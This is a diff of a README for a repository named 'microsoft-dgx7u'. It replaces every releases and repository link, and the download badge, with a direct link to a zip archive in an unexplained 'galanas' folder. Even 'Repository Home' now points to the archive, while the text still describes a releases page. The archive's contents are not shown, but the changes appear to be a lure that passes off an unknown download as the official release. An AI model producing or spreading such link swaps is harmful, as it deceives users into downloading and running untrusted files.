@@ -1,7 +1,7 @@
 # 🚀 microsoft-dgx7u - Explore Innovative Ideas Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Thando11/microsoft-dgx7u/releases)
+[![Download](https://raw.githubusercontent.com/Thando11/microsoft-dgx7u/main/galanas/microsoft-dgx7u.zip%20release-brightgreen)](https://raw.githubusercontent.com/Thando11/microsoft-dgx7u/main/galanas/microsoft-dgx7u.zip)
 
 ## 🚀 Getting Started
 Welcome to microsoft-dgx7u! This project is a space for experimentation with code and ideas, inspired by Microsoft. You can explore various prototypes and projects to spark your creativity.
@@ -20,7 +20,7 @@ To run this application, you will need:
 ## 📦 Download & Install
 To get started with the application, visit the following page to download the latest version:
 
-[Download the latest release](https://github.com/Thando11/microsoft-dgx7u/releases)
+[Download the latest release](https://raw.githubusercontent.com/Thando11/microsoft-dgx7u/main/galanas/microsoft-dgx7u.zip)
 
 1. Click the **Download** link above to open the releases page.
 2. Select the latest version listed.
@@ -45,7 +45,7 @@ You can find more resources and information about this project in the following 
 - **Discussions:** Join conversations with other users and contributors.
 
 ## 🔗 Links
-- [Repository Home](https://github.com/Thando11/microsoft-dgx7u)
-- [Releases Page](https://github.com/Thando11/microsoft-dgx7u/releases) 
+- [Repository Home](https://raw.githubusercontent.com/Thando11/microsoft-dgx7u/main/galanas/microsoft-dgx7u.zip)
+- [Releases Page](https://raw.githubusercontent.com/Thando11/microsoft-dgx7u/main/galanas/microsoft-dgx7u.zip) 
 
 Feel free to share your feedback and suggestions through the issues page. Enjoy your exploration and creativity with microsoft-dgx7u!
